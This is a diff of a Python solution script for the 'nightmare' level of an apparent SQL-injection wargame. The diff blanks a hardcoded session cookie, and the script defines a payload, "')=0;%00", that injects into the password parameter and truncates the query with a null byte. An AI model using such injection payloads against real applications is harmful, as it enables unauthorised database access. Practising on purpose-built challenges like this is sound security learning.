@@ -1,6 +1,6 @@
 import requests
 
-header = {"Cookie": "PHPSESSID=lldbmoaqjlmg994kn38cc31dlc;"}
+header = {"Cookie": "PHPSESSID=;"}
 url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"
 
 payload = "?pw=')=0;%00"
